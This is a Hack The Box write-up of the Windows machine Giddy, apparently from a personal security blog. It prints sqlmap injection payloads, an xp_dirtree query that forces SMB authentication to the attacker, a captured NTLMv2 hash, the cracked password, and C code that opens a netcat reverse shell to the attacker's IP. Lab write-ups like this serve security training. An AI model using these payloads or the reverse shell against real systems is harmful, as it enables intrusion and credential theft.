---
layout: single
title: Giddy - Hack The Box
excerpt: This is the writeup for Giddy, a Windows machine with an interesting twist on SQL injection, PowerShell Web Access and a priv exploiting improper permissions.
date: 2019-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-giddy/giddy_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - sqli
  - powershell
  - 
---

Giddy from Hack the Box is being retired this week so I'll go over the steps to pwn this box. For this one we need to find an easy SQL injection point in the web application then leverage this to trigger an SMB connection back to our machine and use responder to capture some hashes. I learned a bit about Web powershell while doing this box as I didn't know that even existed.

![](/assets/images/htb-writeup-giddy/giddy_logo.png)

### Tools/Blogs used

 - [https://github.com/SpiderLabs/Responder](responder.py)
 - [Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/43390/)

## Quick summary

- There's an SQL injection in the generic products inventory page
- Using the SQL injection in MSSQL, we can trigger an SMB connection back to us and get the NTLM hash with responder.py
- The credentials are used to gain access to a restricted PS session through the Web Powershell interface
- The Ubiquiti Unifi Video service has weak file permissions and allow us to upload an arbitrary file and execute it as SYSTEM
- A reverse shell executable is compiled, uploaded and executed to get SYSTEM access

### Tools/Blogs used

- mdbtools
- readpst

## Detailed steps

### Nmap

Services running:
- HTTP(s)
- RDP
- WinRM

```
root@darkisland:~# nmap -sC -sV -p- 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-08 19:28 EDT
Nmap scan report for giddy.htb (10.10.10.104)
Host is up (0.015s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2018-09-08T23:26:04+00:00; -4m42s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2018-06-16T01:04:03
|_Not valid after:  2018-12-16T01:04:03
|_ssl-date: 2018-09-08T23:26:04+00:00; -4m41s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web enumeration

I found two interesting directories:
- `/mvc`
- `/remote`

```
root@darkisland:~# gobuster -w SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.104

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.104/
[+] Threads      : 50
[+] Wordlist     : SecLists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/09/08 15:02:36 Starting gobuster
=====================================================
/aspnet_client (Status: 301)
/mvc (Status: 301)
/remote (Status: 302)
=====================================================
2018/09/08 15:03:13 Finished
=====================================================
```

**Main page**

The main page has nothing interesting on it, just some image of a dog.

![](/assets/images/htb-writeup-giddy/dog.png)

**/remote**

The `/remote` URI contains a Windows PowerShell Web Access interface which we'll use later.

![](/assets/images/htb-writeup-giddy/remote1.png)

**/mvc**

The `/mvc` URI is some generic demonstration ASP.NET page with a database backend. We can register a new user but there's nothing interesting we can do with a user vs. an anonymous ession. The web application simply lists products from the database. There's also a search function that we can use to look in the database.

![]/assets/images/htb-writeup-giddy/(mvc1.png)

![](/assets/images/htb-writeup-giddy/mvc2.png)

The 1st SQL injection point is the search field since we can trigger an SQL error with a single quote.

![](/assets/images/htb-writeup-giddy/mvc3.png)

The 2nd SQL injection point is the GET parameter field in the product category, we can trigger an SQL error with a single quote also.

GET: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18%27`

![](/assets/images/htb-writeup-giddy/mvc4.png)

SQLmap can be used to enumerate the database contents:

```
root@darkisland:~# sqlmap -u https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 --dbms=mssql --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 19:46:05

[19:46:05] [INFO] testing connection to the target URL
[19:46:05] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[19:46:05] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] 
[19:46:07] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[19:46:07] [INFO] testing if the target URL content is stable
[19:46:07] [WARNING] target URL content is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] 
[19:46:08] [INFO] searching for dynamic content
[19:46:08] [INFO] dynamic content marked for removal (1 region)
[...]
GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: ProductSubCategoryId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ProductSubCategoryId=1 AND 1298=1298

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ProductSubCategoryId=1 AND 1726 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1726=1726) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113)))

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6760=6760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: ProductSubCategoryId=1;WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: ProductSubCategoryId=1 WAITFOR DELAY '0:0:5'
---
[19:46:37] [INFO] testing Microsoft SQL Server
[19:46:38] [INFO] confirming Microsoft SQL Server
[19:46:38] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2016
[19:46:38] [INFO] fetching database names
[19:46:38] [INFO] used SQL query returns 5 entries
[19:46:38] [INFO] retrieved: Injection
[19:46:38] [INFO] retrieved: master
[19:46:38] [INFO] retrieved: model
[19:46:38] [INFO] retrieved: msdb
[19:46:38] [INFO] retrieved: tempdb
available databases [5]:
[*] Injection
[*] master
[*] model
[*] msdb
[*] tempdb

[19:46:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 67 times
[19:46:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.104'

[*] shutting down at 19:46:38
```

We found one of the local user: `Stacy`

```
[19:48:06] [INFO] fetching current user
[19:48:06] [INFO] retrieved: giddy\\stacy
current user:    'giddy\\stacy'
```

We can't pull the users from the database since the current user doesn't have sufficient privileges:

```
[19:47:25] [WARNING] unable to retrieve the number of password hashes for user 'BUILTIN\\Users'
[19:47:25] [INFO] fetching number of password hashes for user 'giddy\\stacy'
[19:47:25] [INFO] retrieved: 
[19:47:25] [INFO] retrieved: 
[19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'giddy\\stacy'
[19:47:26] [INFO] fetching number of password hashes for user 'sa'
[19:47:26] [INFO] retrieved: 
[19:47:26] [INFO] retrieved: 
[19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'sa'
[19:47:26] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))
```

There's nothing else of interest in the database, no credentials or any other hint.

### SMB hashes

We have a username but no password for that account. However we can force the MSSQL server to connect back to use with SMB and then use responder to get the NTLMv2 hash.

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

Query: `GET /mvc/Product.aspx?ProductSubCategoryId=28;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.23\test%27;exec%20master.dbo.xp_dirtree%20@q HTTP/1.1`

With responder.py we can grab the hash:

```
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
[SMB] Requested Share     : \\10.10.14.23\IPC$
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:C8FDC762ECE363F3B36E180C809B690D:0101000000000000E8DABE52C447D401D0CB7EFDCD2687540000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
[SMB] Requested Share     : \\10.10.14.23\TEST
```

Hash: `Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000`

The hash is crackable with the standard rockyou.txt list and we recover the password:

```
root@darkisland:~/giddy# john --fork=4 -w=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)
```

Password: `xNnWo6272k7x`

### Powershell web access

We can now log in to the web powershell interface using:

- Username: `giddy\stacy`
- Password: `xNnWo6272k7x`
- Computer: `giddy`

![](/assets/images/htb-writeup-giddy/remote2.png)

### Privesc

The hint for the privesc is in the documents folder -> `unifivideo`

![](/assets/images/htb-writeup-giddy/remote3.png)

There's a local privilege escalation exploit with Ubiquiti UniFi Video 3.7.3. Basically, the privileges are not set correctly in the installation directory where the service is installed so any user can substitute the executable for the service with a malicious file and get RCE as SYSTEM.

We confirm that the software is installed:

![](/assets/images/htb-writeup-giddy/remote4.png)

First, we create a simple exe that spawn a netcat connection back to us:

```c
#include "stdafx.h"
#include "stdlib.h"


int main()
{
    system("nc.exe -e cmd.exe 10.10.14.23 4444");
    return 0;
}
```

To upload the .exe and netcat to the box, we can spawn an SMB server with Impacket:

```
root@darkisland:~/giddy# python /usr/share/doc/python-impacket/examples/smbserver.py test .
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![](/assets/images/htb-writeup-giddy/remote5.png)

Then we copy the file to taskkill.exe as explained in the exploit description, then stop-start the service.

![](/assets/images/htb-writeup-giddy/remote6.png)

```
root@darkisland:~/hackthebox/Machines/Giddy# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.104] 49805
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
CF559C<redacted>
C:\ProgramData\unifi-video>
```

### Alternate shell method

Instead of using the Web Powershell interface, we can also log in with WinRM. To do that under Linux, I used [Alamot's](https://github.com/Alamot/code-snippets/tree/master/winrm) WinRM ruby script:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.104:5985/wsman',
  #transport: :ssl,
  user: 'stacy',
  password: 'xNnWo6272k7x',
  #:client_cert => 'certnew.cer',
  #:client_key => 'privateKey.key',
  #:no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

```
~/code-snippets/winrm# ruby giddy.rb 
PS giddy\stacy@GIDDY Documents> whoami
giddy\stacy
```